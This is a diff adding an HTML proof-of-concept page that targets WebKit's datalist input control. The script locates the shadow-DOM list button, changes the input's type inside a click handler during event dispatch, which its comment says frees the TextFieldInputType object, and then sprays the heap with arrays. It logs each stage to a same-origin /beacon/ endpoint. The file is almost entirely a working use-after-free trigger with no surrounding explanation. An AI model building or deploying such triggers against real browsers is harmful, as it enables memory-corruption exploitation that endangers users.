@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+ body { margin: 0; padding: 20px; }
+ #in { width: 300px; height: 50px; font-size: 20px; }
+</style>
+</head>
+<body>
+<script>
+function beacon(tag, data) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('POST', '/beacon/' + tag, false);
+        x.send(data || '');
+    } catch (e) { }
+}
+function tag(e) {
+    if (!e) return 'null';
+    var s = e.tagName || '?';
+    var ua = e.getAttribute && e.getAttribute('useragentpart');
+    if (ua) s += '[' + ua + ']';
+    return s;
+}
+beacon('DL-ENV', 'internals=' + typeof window.internals +
+    ' testRunner=' + typeof window.testRunner +
+    ' GCController=' + typeof window.GCController +
+    ' shadowRootFn=' + (window.internals ? typeof internals.shadowRoot : 'n/a') +
+    ' activateAction=' + (window.internals ? typeof internals.activateElement : 'n/a'));
+
+try {
+    var d = document.createElement('datalist');
+    d.id = 'list';
+    d.innerHTML = '<option value="a"><option value="b"><option value="c">';
+    document.body.appendChild(d);
+    var inp = document.createElement('input');
+    inp.id = 'in'; inp.type = 'text'; inp.setAttribute('list', 'list');
+    document.body.appendChild(inp);
+    var r = inp.getBoundingClientRect();
+    beacon('DL-GEOM', 'x=' + r.left + ' top=' + r.top + ' w=' + r.width + ' h=' + r.height);
+
+    // A: internals route (only if the testing API shipped)
+    var button = null;
+    if (window.internals && internals.shadowRoot) {
+        try {
+            var sr = internals.shadowRoot(inp);
+            beacon('DL-SHADOW', sr ? 'root' : 'null');
+            if (sr) {
+                button = sr.querySelector("div[useragentpart='-webkit-list-button']");
+                beacon('DL-SHADOWBTN', tag(button));
+            }
+        } catch (e) { beacon('DL-SHADOWEXC', String(e && e.message || e)); }
+    }
+    // B: elementFromPoint route
+    if (!button) {
+        var probes = [];
+        for (var dx = 0; dx <= 40; dx += 4) {
+            probes.push('dx' + dx + '=' + tag(document.elementFromPoint(r.right - dx, r.top + r.height / 2)));
+        }
+        beacon('DL-EFP', probes.join(' '));
+        for (var dx2 = 0; dx2 <= 80; dx2++) {
+            var e2 = document.elementFromPoint(r.right - dx2, r.top + r.height / 2);
+            if (e2 && e2.getAttribute && e2.getAttribute('useragentpart') === '-webkit-list-button') { button = e2; break; }
+        }
+        beacon('DL-BUTTON', button ? tag(button) : 'none');
+    }
+    if (!button) { beacon('DL-DONE', 'no-button'); throw new Error('stop'); }
+
+    var fired = 0;
+    inp.addEventListener('click', function () {
+        fired++;
+        beacon('DL-LISTENER', 'fired=' + fired);
+        inp.type = 'button';              // frees TextFieldInputType while dispatch is in flight
+        for (var i = 0; i < 64; i++) window['__h' + i] = new Array(64).fill(i);
+        beacon('DL-TYPECHANGED', inp.type);
+    }, false);
+
+    var ev = new MouseEvent('click', { bubbles: true, cancelable: true, composed: true,
+                                       clientX: r.right - 8, clientY: r.top + r.height / 2 });
+    beacon('DL-DISPATCH', 'target=' + tag(button) + ' rect=' + (button.getBoundingClientRect ? JSON.stringify(button.getBoundingClientRect()) : '?'));
+    button.dispatchEvent(ev);
+    beacon('DL-SURVIVED', 'alive: ' + document.getElementById('in').type);
+} catch (e) {
+    beacon('DL-EXC', String(e && e.message || e));
+}
+</script>
+</body>
+</html>
